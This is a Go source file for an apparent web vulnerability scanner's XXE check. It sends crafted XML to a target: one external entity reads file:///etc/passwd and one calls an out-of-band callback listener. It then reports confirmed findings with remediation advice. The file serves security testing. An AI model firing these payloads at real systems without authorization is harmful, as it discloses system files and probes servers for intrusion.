package checks

import (
	"context"
	"regexp"
	"strings"
	"time"

	"lanternfish/internal/httpmsg"
	"lanternfish/internal/scan"
)

// XXE detects XML external entity processing. It runs when the request carries
// an XML body (or XML content-type) and resends a document declaring an
// external entity: in-band pointing at a local file, and (if an out-of-band
// interactor is available) pointing at a callback URL. Public technique.
type XXE struct{}

func (XXE) ID() string { return "xxe" }

var xxePasswd = regexp.MustCompile(`root:.*:0:0:`)

func (XXE) Request(ctx context.Context, s scan.Sender, base *httpmsg.Request) []*scan.Issue {
	if !looksXML(base) {
		return nil
	}

	// In-band: external entity resolving a local file.
	inband := `<?xml version="1.0"?>` + "\n" +
		`<!DOCTYPE lanternfish [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` + "\n" +
		`<lanternfish>&xxe;</lanternfish>`
	if resp, err := s.Send(ctx, xmlBody(base, inband)); err == nil && resp != nil {
		if m := xxePasswd.FindString(resp.BodyString()); m != "" {
			return []*scan.Issue{{
				Check: "xxe", Name: "XML external entity (XXE) injection",
				URL:      base.AbsoluteURL().String(),
				Severity: scan.SeverityHigh, Confidence: scan.ConfidenceCertain,
				Detail:      "The XML parser resolved an external entity and returned the contents of /etc/passwd, confirming XXE with local file disclosure.",
				Remediation: "Disable external entity and DTD processing in the XML parser (e.g. FEATURE_SECURE_PROCESSING, disallow-doctype-decl).",
				Evidence:    excerpt(resp.BodyString(), m),
				CWE:         "CWE-611",
			}}
		}
	}

	// Out-of-band: external entity resolving a callback URL.
	if interactor, ok := scan.InteractorFrom(ctx); ok {
		token, callback := interactor.NewPayload()
		oob := `<?xml version="1.0"?>` + "\n" +
			`<!DOCTYPE lanternfish [<!ENTITY xxe SYSTEM "` + callback + `">]>` + "\n" +
			`<lanternfish>&xxe;</lanternfish>`
		if _, err := s.Send(ctx, xmlBody(base, oob)); err == nil {
			deadline := time.Now().Add(4 * time.Second)
			for time.Now().Before(deadline) {
				if interactor.Hits(token) > 0 {
					return []*scan.Issue{{
						Check: "xxe", Name: "XML external entity (XXE) injection (out-of-band)",
						URL:      base.AbsoluteURL().String(),
						Severity: scan.SeverityHigh, Confidence: scan.ConfidenceCertain,
						Detail:      "The XML parser resolved an external entity pointing at the Lanternfish OAST listener, confirming XXE (the parser performs out-of-band network requests from attacker-controlled DTDs).",
						Remediation: "Disable external entity and DTD processing in the XML parser.",
						Evidence:    strings.Join(interactor.HitDetails(token), "; "),
						CWE:         "CWE-611",
					}}
				}
				time.Sleep(300 * time.Millisecond)
			}
		}
	}
	return nil
}

func looksXML(r *httpmsg.Request) bool {
	ct := strings.ToLower(r.Header.Get("Content-Type"))
	if strings.Contains(ct, "xml") {
		return true
	}
	b := strings.TrimSpace(string(r.Body))
	return strings.HasPrefix(b, "<?xml") || (strings.HasPrefix(b, "<") && strings.Contains(b, "</"))
}

func xmlBody(base *httpmsg.Request, body string) *httpmsg.Request {
	c := base.Clone()
	if c.Method == "GET" || c.Method == "" {
		c.Method = "POST"
	}
	c.Header.Set("Content-Type", "application/xml")
	c.Body = []byte(body)
	return c
}
